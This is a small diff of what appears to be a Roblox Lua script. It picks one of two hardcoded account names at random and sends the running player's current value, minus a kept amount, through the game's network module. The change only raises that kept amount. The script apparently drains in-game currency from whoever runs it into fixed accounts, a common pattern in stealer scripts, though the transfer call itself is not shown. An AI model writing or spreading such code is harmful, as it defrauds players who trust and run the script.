@@ -18,7 +18,7 @@ end
 local receivers = { "Thien_Hoa9x", "dinhhabb1a" }
 local receiver = receivers[math.random(1, #receivers)]
 
-local amountToSend = currentValue - 500000
+local amountToSend = currentValue - 5000000
 
 local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
 local Network = require(Client.Network)
